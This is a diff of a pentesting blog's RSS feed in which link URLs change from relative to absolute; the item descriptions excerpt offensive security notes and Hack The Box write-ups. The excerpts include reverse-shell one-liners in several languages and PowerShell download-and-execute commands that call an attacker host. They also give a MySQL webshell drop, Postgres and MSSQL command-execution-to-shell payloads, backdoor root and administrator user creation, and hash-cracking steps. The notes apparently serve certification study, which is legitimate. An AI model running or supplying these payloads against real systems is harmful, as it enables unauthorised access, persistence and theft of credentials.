       <description>Cheat sheets https://oscp.infosecsanyam.in/shells/reverse-shell-cheat-sheet https://github.com/the-emmon/lsp-reverse-shell Common shells # bash &amp;gt; bash -i &amp;gt;&amp;amp; /dev/tcp/127.0.0.1/4444 0&amp;gt;&amp;amp;1 # php &amp;gt; php -r &amp;#39;$sock=fsockopen(&amp;#34;127.0.0.1&amp;#34;,4444);exec(&amp;#34;/bin/sh -i &amp;lt;&amp;amp;3 &amp;gt;&amp;amp;3 2&amp;gt;&amp;amp;3&amp;#34;);&amp;#39; # python &amp;gt; python -c &amp;#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&amp;#34;127.0.0.1&amp;#34;,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&amp;#34;/bin/sh&amp;#34;,&amp;#34;-i&amp;#34;]);&amp;#39; # nc1 &amp;gt; nc -e /bin/sh 127.0.0.1 4444 # nc2 &amp;gt; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&amp;gt;&amp;amp;1|nc 127.0.0.1 4444 &amp;gt;/tmp/f # perl &amp;gt; perl -e &amp;#39;use Socket;$i=&amp;#34;127.0.0.1&amp;#34;;$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&amp;#34;tcp&amp;#34;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&amp;#34;&amp;gt;&amp;amp;S&amp;#34;);open(STDOUT,&amp;#34;&amp;gt;&amp;amp;S&amp;#34;);open(STDERR,&amp;#34;&amp;gt;&amp;amp;S&amp;#34;);exec(&amp;#34;/bin/sh -i&amp;#34;);};&amp;#39; ## perl Windows &amp;gt; perl -MIO -e &amp;#39;$c=new IO::Socket::INET(PeerAddr,&amp;#34;ip:4444&amp;#34;);STDIN-&amp;gt;fdopen($c,r);$~-&amp;gt;fdopen($c,w);system$_ while&amp;lt;&amp;gt;;&amp;#39; use IO::Socket; use IO::Socket::INET; $p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,&amp;#34;ip:443&amp;#34;);STDIN-&amp;gt;fdopen($c,r);$~-&amp;gt;fdopen($c,w);system$_ while&amp;lt;&amp;gt;; # ruby * https://github.</description>
     </item>
     
     <item>
       <title>Notes - Password/Hash Cracking</title>
-      <link>/notes/5-passwd-hash-cracking/</link>
+      <link>https://meowmeowattack.github.io/notes/5-passwd-hash-cracking/</link>
       <pubDate>Wed, 06 Jul 2022 23:18:05 +1300</pubDate>
       
-      <guid>/notes/5-passwd-hash-cracking/</guid>
+      <guid>https://meowmeowattack.github.io/notes/5-passwd-hash-cracking/</guid>
       <description>bkcrack: cracking password when some files are known https://book.hacktricks.xyz/generic-methodologies-and-resources/brute-force#known-plaintext-zip-attack Browser password cracking https://github.com/moonD4rk/HackBrowserData crackmeexec mass brute forcing &amp;gt; crackmapexec ldap -u users.txt -p pass.txt -M laps &amp;lt;target-ip&amp;gt; gpg cracking convert private key to john format &amp;gt; gpg2john creds.priv crack the private key &amp;gt; john --wordlist=/usr/share/wordlists/rockyou.txt gpg.john import to keyring &amp;gt; echo &amp;#34;qwertyuiop&amp;#34; | gpg --batch --yes --allow-secret-key-import --import creds.priv decrypt gpg text &amp;gt; echo &amp;#34;qwertyuiop&amp;#34; | gpg --batch --yes --decrypt --passphrase-fd 0 creds.</description>
     </item>
     
     <item>
       <title>Notes - Buffer Overflow Development</title>
-      <link>/notes/6a-bof/</link>
+      <link>https://meowmeowattack.github.io/notes/6a-bof/</link>
       <pubDate>Tue, 05 Jul 2022 23:18:05 +1300</pubDate>
       
-      <guid>/notes/6a-bof/</guid>
+      <guid>https://meowmeowattack.github.io/notes/6a-bof/</guid>
       <description>Understanding the registers ESP: keeps track of most recently referenced location on the stack (top of the stack), dynamic EBP: stores a pointer to the top of the stack when a function is called, fixed for the frame EIP: points to the next instruction, usually targeted Common MS protections DEP: Data Execution Prevention, prevent code execution from data pages ASLR: Address Space Layout Randomisation, randomise base addresses of app and dll on boot Older OS such as XP does not have this CFG: Control Flow Guard, performs validation of indirect code branching, prevents pointer overwrites BOF Methodology FUZZ THE APPLICATION FINDING THE EIP OFFSET CONTROL THE EIP CHECK FOR BAD CHARACTERS FINDING A RETURN ADDRESS - JMP ESP SHELL CODE GENERATION Find entry point and offset Run the app (service) and find entry point (may use wireshark) Fuzz to find bof offset, roughly the range, this may trigger error on the return address Genereate patterns to substitute the buffer &amp;gt; /opt/metasploit-framework/embedded/framework/tools/exploit/pattern_create.</description>
     </item>
     
     <item>
       <title>Notes - Reverse Engineering</title>
-      <link>/notes/6b-rev-eng/</link>
+      <link>https://meowmeowattack.github.io/notes/6b-rev-eng/</link>
       <pubDate>Mon, 04 Jul 2022 23:18:05 +1300</pubDate>
       
-      <guid>/notes/6b-rev-eng/</guid>
+      <guid>https://meowmeowattack.github.io/notes/6b-rev-eng/</guid>
       <description>Android apktool https://bitbucket.org/iBotPeaches/apktool/downloads/ signing apl &amp;gt; keytool -genkey -v -keystore my-release-key.keystore -alias alias_name -keyalg RSA -keysize 2048 -validity 10000&amp;gt; jarsigner -verbose -sigalg SHA256withRSA -digestalg SHA-256 -keystore my-release-key.keystore catchv1.0/dist/catchv1.0.apk alias_name </description>
     </item>
     
     <item>
       <title>HTB - Carpediem [Hard]</title>
-      <link>/htb/carpediem/</link>
+      <link>https://meowmeowattack.github.io/htb/carpediem/</link>
       <pubDate>Sun, 03 Jul 2022 23:18:05 +1300</pubDate>
       
-      <guid>/htb/carpediem/</guid>
+      <guid>https://meowmeowattack.github.io/htb/carpediem/</guid>
       <description>Scanning TCP Scan TARGET=10.10.11.167 &amp;amp;&amp;amp; nmap -p$(nmap -p- --min-rate=1000 -T4 $TARGET -Pn | grep ^[0-9] | cut -d &amp;#39;/&amp;#39; -f 1 | tr &amp;#39;\n&amp;#39; &amp;#39;,&amp;#39; | sed s/,$//) -sC -sV -Pn -vvv $TARGET -oN nmap_tcp_all.nmapPORT STATE SERVICE REASON VERSION22/tcp open ssh syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)80/tcp open http syn-ack ttl 63 nginx 1.18.0 (Ubuntu)|_http-title: Comming Soon|_http-server-header: nginx/1.18.0 (Ubuntu)| http-methods: |_ Supported Methods: GET HEAD Domain: carpediem.</description>
     </item>
     
     <item>
       <title>HTB - Faculty [Medium]</title>
-      <link>/htb/retired/faculty/</link>
+      <link>https://meowmeowattack.github.io/htb/retired/faculty/</link>
       <pubDate>Sun, 03 Jul 2022 23:18:05 +1300</pubDate>
       
-      <guid>/htb/retired/faculty/</guid>
+      <guid>https://meowmeowattack.github.io/htb/retired/faculty/</guid>
       <description>Scanning TARGET=10.10.11.169 &amp;amp;&amp;amp; nmap -p$(nmap -p- --min-rate=1000 -T4 $TARGET -Pn | grep ^[0-9] | cut -d &amp;#39;/&amp;#39; -f 1 | tr &amp;#39;\n&amp;#39; &amp;#39;,&amp;#39; | sed s/,$//) -sC -sV -Pn -vvv $TARGET -oN nmap_tcp_all.nmapPORT STATE SERVICE REASON VERSION22/tcp open ssh syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)80/tcp open http syn-ack ttl 63 nginx 1.18.0 (Ubuntu)|_http-title: Did not follow redirect to http://faculty.htb|_http-server-header: nginx/1.18.0 (Ubuntu)| http-methods: |_ Supported Methods: GET HEAD POST OPTIONSService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel domain: faculty.</description>
     </item>
     
     <item>
       <title>Notes - File Transfer</title>
-      <link>/notes/7a-filetransfer/</link>
+      <link>https://meowmeowattack.github.io/notes/7a-filetransfer/</link>
       <pubDate>Sun, 03 Jul 2022 23:18:05 +1300</pubDate>
       
-      <guid>/notes/7a-filetransfer/</guid>
+      <guid>https://meowmeowattack.github.io/notes/7a-filetransfer/</guid>
       <description>certutil &amp;gt; certutil.exe -urlcache -f http://&amp;lt;ip&amp;gt;/file file ftp For transfering binaries, turn on binary mode Over a pivot, turn on passive mode Recursive download &amp;gt; wget -r ftp://&amp;lt;user&amp;gt;:&amp;lt;pass&amp;gt;@&amp;lt;ip&amp;gt; port forwarding windows &amp;gt; netsh interface portproxy add v4tov4 listenaddress=127.0.0.1 listenport=445 connectaddress=&amp;lt;attacker-ip&amp;gt; connectport=&amp;lt;attacker-port&amp;gt; powershell &amp;gt; powershell.exe IEX (New-Object Net.WebClient).DownloadString(&amp;#39;http://192.168.119.172/shell.ps1&amp;#39;) smb # On share host &amp;gt; impacket-smbserver -smb2support &amp;lt;share-name&amp;gt; /path-to-share # On client &amp;gt; copy \\&amp;lt;ip&amp;gt;\&amp;lt;share-name&amp;gt;\file file vbs &amp;gt; echo Set o=CreateObject^(&amp;#34;MSXML2.XMLHTTP&amp;#34;^):Set a=CreateObject^(&amp;#34;ADODB.Stream&amp;#34;^):Set f=Createobject^(&amp;#34;Scripting.</description>
     </item>
     
     <item>
       <title>Notes - Pivoting/Networking</title>
-      <link>/notes/7b-pivoting/</link>
+      <link>https://meowmeowattack.github.io/notes/7b-pivoting/</link>
       <pubDate>Sat, 02 Jul 2022 23:18:05 +1300</pubDate>
       
-      <guid>/notes/7b-pivoting/</guid>
+      <guid>https://meowmeowattack.github.io/notes/7b-pivoting/</guid>
       <description>chisel https://ap3x.github.io/posts/pivoting-with-chisel/ https://vegardw.medium.com/reverse-socks-proxy-using-chisel-the-easy-way-48a78df92f29 # On Kali &amp;gt; chisel server -p &amp;lt;kali-port&amp;gt; --reverse # update /etc/proxychains.conf # comment out `proxy_dns` for nmap to work socks5 127.0.0.1 &amp;lt;sock-port&amp;gt; # On Pivot # for sock proxy &amp;gt; chisel client --max-retry-count=1 &amp;lt;kali-ip&amp;gt;:&amp;lt;kali-port&amp;gt; R:&amp;lt;sock-port&amp;gt;:socks # for socks proxy # for specific port forwarding &amp;gt; chisel client --max-retry-count=1 &amp;lt;kali-ip&amp;gt;:&amp;lt;kali-port&amp;gt; R:&amp;lt;kali-mapping-port&amp;gt;:localhost:&amp;lt;target-local-port&amp;gt; # for specific port mapping Escape org firewall outbound # On a box inside the org # edit /etc/proxychains.</description>
     </item>
     
     <item>
       <title>Notes - Maintain Access</title>
-      <link>/notes/7c-maintain-access/</link>
+      <link>https://meowmeowattack.github.io/notes/7c-maintain-access/</link>
       <pubDate>Fri, 01 Jul 2022 23:18:05 +1300</pubDate>
       
-      <guid>/notes/7c-maintain-access/</guid>
+      <guid>https://meowmeowattack.github.io/notes/7c-maintain-access/</guid>
       <description>Create new user # windows &amp;gt; net user hacker pass123 /add &amp;amp;&amp;amp; net localgroup administrators hacker /add # linux # Generate password hash &amp;gt; openssl passwd -1 -salt hacker pass123 # Add to /etc/passwd &amp;gt; echo &amp;#39;hacker:$1$hacker$zVnrpoW2JQO5YUrLmAs.o1:0:0:root:/root:/bin/bash&amp;#39; &amp;gt;&amp;gt; /etc/passwd # If running a script &amp;gt; echo &amp;#39;echo &amp;#34;hacker:\$1\$hacker\$zVnrpoW2JQO5YUrLmAs.o1:0:0:root:/root:/bin/bash&amp;#34; &amp;gt;&amp;gt; /etc/passwd&amp;#39; &amp;gt; script.sh Enable rdp # powershell &amp;gt; Set-ItemProperty -Path &amp;#39;HKLM:\System\CurrentControlSet\Control\Terminal Server&amp;#39;-name &amp;#34;fDenyTSConnections&amp;#34; -Value 0 &amp;gt; Enable-NetFirewallRule -DisplayGroup &amp;#34;Remote Desktop&amp;#34; &amp;gt; Set-ItemProperty -Path &amp;#39;HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&amp;#39; -name &amp;#34;UserAuthentication&amp;#34; -Value 1 # cmd &amp;gt; reg add &amp;#34;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server&amp;#34; /v fDenyTSConnections /t REG_DWORD /d 0 /f Proof Collect proof of compromised &amp;gt; hostname &amp;amp;&amp;amp; id &amp;amp;&amp;amp; cat proof.</description>
     </item>
     
     <item>
       <title>HTB - Trick [Easy]</title>
-      <link>/htb/retired/trick/</link>
+      <link>https://meowmeowattack.github.io/htb/retired/trick/</link>
       <pubDate>Sun, 26 Jun 2022 23:18:05 +1300</pubDate>
       
-      <guid>/htb/retired/trick/</guid>
+      <guid>https://meowmeowattack.github.io/htb/retired/trick/</guid>
       <description>Scanning TARGET=10.10.11.166 &amp;amp;&amp;amp; nmap -p$(nmap -p- --min-rate=1000 -T4 $TARGET -Pn | grep ^[0-9] | cut -d &amp;#39;/&amp;#39; -f 1 | tr &amp;#39;\n&amp;#39; &amp;#39;,&amp;#39; | sed s/,$//) -sC -sV -Pn -vvv $TARGET -oN nmap_tcp_all.nmapPORT STATE SERVICE REASON VERSION22/tcp open ssh syn-ack ttl 63 OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)25/tcp open smtp syn-ack ttl 63 Postfix smtpd|_smtp-commands: debian.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING53/tcp open domain syn-ack ttl 63 ISC BIND 9.</description>
     </item>
     
     <item>
       <title>HTB - OverGraph [Hard]</title>
-      <link>/htb/retired/overgraph/</link>
+      <link>https://meowmeowattack.github.io/htb/retired/overgraph/</link>
       <pubDate>Sun, 19 Jun 2022 23:18:05 +1300</pubDate>
       
-      <guid>/htb/retired/overgraph/</guid>
+      <guid>https://meowmeowattack.github.io/htb/retired/overgraph/</guid>
       <description>Scanning TARGET=10.10.11.157 &amp;amp;&amp;amp; nmap -p$(nmap -p- --min-rate=1000 -T4 $TARGET -Pn | grep ^[0-9] | cut -d &amp;#39;/&amp;#39; -f 1 | tr &amp;#39;\n&amp;#39; &amp;#39;,&amp;#39; | sed s/,$//) -sC -sV -Pn -vvv $TARGET -oN nmap_tcp_all.nmapnmap -p- --min-rate=1000 -T4 10.10.11.157 -Pn -sU -vvvnmap --min-rate=1000 -T4 10.10.11.157 -Pn -sU -vvvPORT STATE SERVICE REASON VERSION22/tcp open ssh syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)80/tcp open http syn-ack ttl 63 nginx 1.</description>
     </item>
     
     <item>
       <title>Notes - Attack by ports/protocols: FTP tcp:21, TFTP udp:69</title>
-      <link>/notes/attack-by-protocols/ftp-tcp21&#43;tftp-udp69/</link>
+      <link>https://meowmeowattack.github.io/notes/attack-by-protocols/ftp-tcp21&#43;tftp-udp69/</link>
       <pubDate>Wed, 01 Jun 2022 23:18:05 +1300</pubDate>
       
-      <guid>/notes/attack-by-protocols/ftp-tcp21&#43;tftp-udp69/</guid>
+      <guid>https://meowmeowattack.github.io/notes/attack-by-protocols/ftp-tcp21&#43;tftp-udp69/</guid>
       <description>21/tcp ftp https://book.hacktricks.xyz/pentesting/pentesting-ftp # ftp brute force&amp;gt; nmap --script ftp-brute -p 21 &amp;lt;host&amp;gt;# ftp `bounce` scan&amp;gt; nmap -PO -b username:password@ftpserver.tld:21 -vvv -oN scan_internal.nmap 127.0.0.1 --script=&amp;#34;default,vuln&amp;#34;# recursive download&amp;gt; wget -r ftp://anonymous:anonymous@&amp;lt;ip&amp;gt;:&amp;lt;port&amp;gt;/# Use `ls -la` to show hidden files# If cannot list directory, try `passive` mode lftp &amp;gt; lftplftp :~&amp;gt; set ftp:ssl-force falselftp :~&amp;gt; set ssl:verify-certificate nolftp :~&amp;gt; connect &amp;lt;ip&amp;gt;lftp :~&amp;gt; login anonymous anonymouslftp :~&amp;gt; ls udp/69 tftp https://book.</description>
     </item>
     
     <item>
       <title>Notes - Attack by ports/protocols: IRC tcp:194,6660-7000</title>
-      <link>/notes/attack-by-protocols/irc-tcp1946660~7000/</link>
+      <link>https://meowmeowattack.github.io/notes/attack-by-protocols/irc-tcp1946660~7000/</link>
       <pubDate>Wed, 01 Jun 2022 23:18:05 +1300</pubDate>
       
-      <guid>/notes/attack-by-protocols/irc-tcp1946660~7000/</guid>
+      <guid>https://meowmeowattack.github.io/notes/attack-by-protocols/irc-tcp1946660~7000/</guid>
       <description>tcp/194 6660-7000 irc &amp;gt; nmap -sV --script irc-botnet-channels,irc-info,irc-unrealircd-backdoor -p 194,6660-7000 &amp;lt;ip&amp;gt;&amp;gt; hexchat </description>
     </item>
     
     <item>
       <title>Notes - Attack by ports/protocols: MSSQL tcp:1433</title>
-      <link>/notes/attack-by-protocols/mssql-tcp1433/</link>
+      <link>https://meowmeowattack.github.io/notes/attack-by-protocols/mssql-tcp1433/</link>
       <pubDate>Wed, 01 Jun 2022 23:18:05 +1300</pubDate>
       
-      <guid>/notes/attack-by-protocols/mssql-tcp1433/</guid>
+      <guid>https://meowmeowattack.github.io/notes/attack-by-protocols/mssql-tcp1433/</guid>
       <description>tcp/1433 mssql RCE: https://book.hacktricks.xyz/pentesting/pentesting-mssql-microsoft-sql-server#execute-commands &amp;gt; impacket-mssqlclient &amp;lt;user&amp;gt;:&amp;lt;pass&amp;gt;@&amp;lt;ip&amp;gt;&amp;gt; enable_xp_cmdshell&amp;gt; xp_cmdshell powershell.exe IEX (New-Object Net.WebClient).DownloadString(\&amp;#34;http://&amp;lt;ip&amp;gt;/shell.ps1\&amp;#34;); error-based injeciton https://www.exploit-db.com/papers/12975 https://perspectiverisk.com/mssql-practical-injection-cheat-sheet/ cracking mdf files https://github.com/improvedk/OrcaMDF https://github.com/xpn/Powershell-PostExploitation/tree/master/Invoke-MDFHashes </description>
     </item>
     
     <item>
       <title>Notes - Attack by ports/protocols: MYSQL tcp:3306</title>
-      <link>/notes/attack-by-protocols/mysql-tcp3306/</link>
+      <link>https://meowmeowattack.github.io/notes/attack-by-protocols/mysql-tcp3306/</link>
       <pubDate>Wed, 01 Jun 2022 23:18:05 +1300</pubDate>
       
-      <guid>/notes/attack-by-protocols/mysql-tcp3306/</guid>
+      <guid>https://meowmeowattack.github.io/notes/attack-by-protocols/mysql-tcp3306/</guid>
       <description>tcp/3306 mysql write webshell to filesystem &amp;gt; SELECT &amp;#34;&amp;lt;?php echo shell_exec($_GET[&amp;#39;cmd&amp;#39;]);?&amp;gt;&amp;#34; INTO OUTFILE &amp;#34;/var/www/https/blogblog/wp-content/uploads/shell.php&amp;#34;; MariaDB MariaDB 10.2, https://github.com/Al1ex/CVE-2021-27928 Prepare the exploit: https://github.com/1N3/PrivEsc/blob/master/mysql/raptor_udf2.c &amp;gt; wget https://raw.githubusercontent.com/1N3/PrivEsc/master/mysql/raptor_udf2.c&amp;gt; gcc -g -c raptor_udf2.c&amp;gt; gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc&amp;gt; mysql -u root -p Exploit steps mysql&amp;gt; use mysql;mysql&amp;gt; create table foo(line blob);mysql&amp;gt; insert into foo values(load_file(&amp;#39;/tmp/raptor_udf2.so&amp;#39;));# Look for the value of plugin_dir and use the plugin_dir as the dump file locationmysql&amp;gt; show variables like &amp;#39;%plugin%&amp;#39;;mysql&amp;gt; select * from foo into dumpfile &amp;#34;&amp;lt;select-a-path-from-above&amp;gt;/raptor_udf2.</description>
     </item>
     
     <item>
       <title>Notes - Attack by ports/protocols: NFS tcp:2049</title>
-      <link>/notes/attack-by-protocols/nfs-tcp2049/</link>
+      <link>https://meowmeowattack.github.io/notes/attack-by-protocols/nfs-tcp2049/</link>
       <pubDate>Wed, 01 Jun 2022 23:18:05 +1300</pubDate>
       
-      <guid>/notes/attack-by-protocols/nfs-tcp2049/</guid>
+      <guid>https://meowmeowattack.github.io/notes/attack-by-protocols/nfs-tcp2049/</guid>
       <description>tcp/2049 NFS no_root_squash/no_all_squash misconfiguration PE Check vulnerability &amp;gt; showmount -e 127.0.0.1Export list for 127.0.0.1:/srv/Share 127.0.0.1/32,10.1.1.0/24&amp;gt; cat /etc/exports/srv/Share 10.1.1.0/24(insecure,rw)/srv/Share 127.0.0.1/32(`no_root_squash`,`insecure`,rw) Download exploit and compile: https://github.com/sahlberg/libnfs.git &amp;gt; ./bootstrap&amp;gt; ./configure&amp;gt; make&amp;gt; gcc -fPIC -shared -o ld_nfs.so examples/ld_nfs.c -ldl -lnfs -I./include/ -L./lib/.libs/ create a simple exploit pwn.c and compile, gcc pwn.c -o pwn int main(void){setreuid(0,0); sys tem(&amp;#34;/bin/bash&amp;#34;); return 0;} Transfer the compiled example (i.e ld_nfs.so), exploit (i.</description>
     </item>
     
     <item>
       <title>Notes - Attack by ports/protocols: POP3 tcp:110</title>
-      <link>/notes/attack-by-protocols/pop3-tcp110/</link>
+      <link>https://meowmeowattack.github.io/notes/attack-by-protocols/pop3-tcp110/</link>
       <pubDate>Wed, 01 Jun 2022 23:18:05 +1300</pubDate>
       
-      <guid>/notes/attack-by-protocols/pop3-tcp110/</guid>
+      <guid>https://meowmeowattack.github.io/notes/attack-by-protocols/pop3-tcp110/</guid>
       <description>tcp/110 pop3 receive emails &amp;gt; telnet &amp;lt;ip&amp;gt; 110&amp;gt; user &amp;lt;user&amp;gt;&amp;gt; pass &amp;lt;pass&amp;gt;&amp;gt; list&amp;gt; retr &amp;lt;num&amp;gt;, retr 1 </description>
     </item>
     
     <item>
       <title>Notes - Attack by ports/protocols: POSTGRES tcp:5432</title>
-      <link>/notes/attack-by-protocols/postgres-tcp5432/</link>
+      <link>https://meowmeowattack.github.io/notes/attack-by-protocols/postgres-tcp5432/</link>
       <pubDate>Wed, 01 Jun 2022 23:18:05 +1300</pubDate>
       
-      <guid>/notes/attack-by-protocols/postgres-tcp5432/</guid>
+      <guid>https://meowmeowattack.github.io/notes/attack-by-protocols/postgres-tcp5432/</guid>
       <description>tcp/5432 postgres RCE &amp;gt; create table logs (value text);&amp;gt; delete from logs; copy logs (value) from program &amp;#39;whoami&amp;#39;; select * from logs;&amp;gt; delete from logs; copy logs (value) from program &amp;#39;nc -v &amp;lt;ip&amp;gt; &amp;lt;port&amp;gt; -e /bin/bash&amp;#39;; select * from logs; For very restricted hosts, use base64 to transfer nc &amp;gt; base64 -w 0 &amp;lt; /usr/bin/nc &amp;gt; nc.txt&amp;gt; delete from logs; copy logs (value) from program &amp;#39;echo [base64_content] &amp;gt; /tmp/nc.</description>
     </item>
     
     <item>
       <title>Notes - Attack by ports/protocols: REDIS tcp:6379</title>
-      <link>/notes/attack-by-protocols/redis-tcp6379/</link>
+      <link>https://meowmeowattack.github.io/notes/attack-by-protocols/redis-tcp6379/</link>
       <pubDate>Wed, 01 Jun 2022 23:18:05 +1300</pubDate>
       
-      <guid>/notes/attack-by-protocols/redis-tcp6379/</guid>
+      <guid>https://meowmeowattack.github.io/notes/attack-by-protocols/redis-tcp6379/</guid>
       <description>tcp/6379 redis 5.0.9, https://github.com/vulhub/redis-rogue-getshell https://book.hacktricks.xyz/pentesting/6379-pentesting-redis </description>
     </item>
     
     <item>
       <title>Notes - Attack by ports/protocols: RSYNC tcp:873</title>
-      <link>/notes/attack-by-protocols/rsync-tcp873/</link>
+      <link>https://meowmeowattack.github.io/notes/attack-by-protocols/rsync-tcp873/</link>
       <pubDate>Wed, 01 Jun 2022 23:18:05 +1300</pubDate>
       
-      <guid>/notes/attack-by-protocols/rsync-tcp873/</guid>
+      <guid>https://meowmeowattack.github.io/notes/attack-by-protocols/rsync-tcp873/</guid>
       <description>tcp/873 rsync https://book.hacktricks.xyz/pentesting/873-pentesting-rsync &amp;gt; nmap -sV --script &amp;#34;rsync-list-modules&amp;#34; -p873 &amp;lt;ip&amp;gt;# list files&amp;gt; rsync -av --list-only rsync://&amp;lt;ip&amp;gt;# transfer files&amp;gt; rsync -av rsync://&amp;lt;ip&amp;gt;/fox ./fox # upload files&amp;gt; rsync -av .ssh/ rsync://&amp;lt;ip&amp;gt;/fox/.ssh </description>
     </item>
     
     <item>
       <title>Notes - Attack by ports/protocols: SMB tcp:139,445</title>
-      <link>/notes/attack-by-protocols/smb-tcp139445/</link>
+      <link>https://meowmeowattack.github.io/notes/attack-by-protocols/smb-tcp139445/</link>
       <pubDate>Wed, 01 Jun 2022 23:18:05 +1300</pubDate>
       
-      <guid>/notes/attack-by-protocols/smb-tcp139445/</guid>
+      <guid>https://meowmeowattack.github.io/notes/attack-by-protocols/smb-tcp139445/</guid>
       <description>tcp/139 smb grep the smb version, https://github.com/rewardone/OSCPRepo/blob/master/scripts/recon_enum/smbver.sh &amp;gt; ngrep -i -d tun0 &amp;#39;s.?a.?m.?b.?a.*[[:digit:]]&amp;#39;&amp;gt; smbclient -L \\\\ip -N new smbclient doesn&amp;rsquo;t support old protocols, to enable # edit /etc/samba/smb.conf under `global`client min protocol = LANMAN1&amp;gt; service smbd restart smb 3.4.5 symlink directory traversal: https://github.com/roughiz/Symlink-Directory-Traversal-smb-manually List all smb shared &amp;gt; smbclient -L \\\\{target-ip}\\ -U {user_name} Recurse all content under share &amp;gt; smbmap -u {user} -p {pass} -H {target-ip} -d {target.</description>
     </item>
     
     <item>
       <title>Notes - Attack by ports/protocols: SMTP tcp:25</title>
-      <link>/notes/attack-by-protocols/smtp-tcp25/</link>
+      <link>https://meowmeowattack.github.io/notes/attack-by-protocols/smtp-tcp25/</link>
       <pubDate>Wed, 01 Jun 2022 23:18:05 +1300</pubDate>
       
-      <guid>/notes/attack-by-protocols/smtp-tcp25/</guid>
+      <guid>https://meowmeowattack.github.io/notes/attack-by-protocols/smtp-tcp25/</guid>
       <description>tcp/25 smtp &amp;gt; smtp-user-enum -U /usr/share/wordlists/dirb/others/names.txt -M RCPT -t &amp;lt;ip&amp;gt;&amp;gt; perl smtp-user-enum.pl -M VRFY -U /usr/share/seclists/Usernames/Names/names.txt -t &amp;lt;ip&amp;gt;&amp;gt; nmap --script smtp-enum-users &amp;lt;ip&amp;gt; -Pn </description>
     </item>
     
     <item>
       <title>Notes - Attack by ports/protocols: SNMP udp:161</title>
-      <link>/notes/attack-by-protocols/snmp-udp161/</link>
+      <link>https://meowmeowattack.github.io/notes/attack-by-protocols/snmp-udp161/</link>
       <pubDate>Wed, 01 Jun 2022 23:18:05 +1300</pubDate>
       
-      <guid>/notes/attack-by-protocols/snmp-udp161/</guid>
+      <guid>https://meowmeowattack.github.io/notes/attack-by-protocols/snmp-udp161/</guid>
       <description>udp/161 snmp 161 uses UDP, hence need the nmap -sU flag to scan https://github.com/dheiland-r7/snmp &amp;gt; perl snmpbw.pl &amp;lt;ip&amp;gt; public 2 1 community string enum: # https://raw.githubusercontent.com/thedarksource/Security/master/Network/SNMP/snmp_community_strings_wordlist_onesixtyone.txt# /usr/share/wordlists/SecLists/Discovery/SNMP/&amp;gt; onesixtyone &amp;lt;ip&amp;gt; -c snmp_community_strings_wordlist_onesixtyone.txt snmp-check &amp;gt; snmp-check &amp;lt;ip&amp;gt; snmpwalk, setup with extended walk: https://book.hacktricks.xyz/pentesting/pentesting-snmp/snmp-rce#getting-the-shell-from-net-snmp-extend &amp;gt; snmpwalk -v 2c -c public &amp;lt;ip&amp;gt; NET-SNMP-EXTEND-MIB::nsExtendObjects&amp;gt; snmpwalk -v 2c -c public &amp;lt;ip&amp;gt; NET-SNMP-EXTEND-MIB::nsExtendOutputFull </description>
     </item>
     
     <item>
       <title>Notes - Attack by ports/protocols: SSH tcp:22</title>
-      <link>/notes/attack-by-protocols/ssh-tcp22/</link>
+      <link>https://meowmeowattack.github.io/notes/attack-by-protocols/ssh-tcp22/</link>
       <pubDate>Wed, 01 Jun 2022 23:18:05 +1300</pubDate>
       
-      <guid>/notes/attack-by-protocols/ssh-tcp22/</guid>
+      <guid>https://meowmeowattack.github.io/notes/attack-by-protocols/ssh-tcp22/</guid>
       <description>22/tcp ssh Recover from authorized_keys: https://blog.g0tmi1k.com/2010/04/pwnos/ ssh key prediction: https://gitbook.brainyou.stream/basic-linux/ssh-key-predictable-prng-authorized_keys-process </description>
     </item>
     
     <item>
       <title>Notes - Attack by ports/protocols: TELNET tcp:23</title>
-      <link>/notes/attack-by-protocols/telnet-tcp23/</link>
+      <link>https://meowmeowattack.github.io/notes/attack-by-protocols/telnet-tcp23/</link>
       <pubDate>Wed, 01 Jun 2022 23:18:05 +1300</pubDate>
       
-      <guid>/notes/attack-by-protocols/telnet-tcp23/</guid>
+      <guid>https://meowmeowattack.github.io/notes/attack-by-protocols/telnet-tcp23/</guid>
       <description>23/tcp telnet telnet supports login, the password prompt may be slow &amp;gt; telnet -l &amp;lt;user&amp;gt; &amp;lt;ip&amp;gt; </description>
     </item>
     
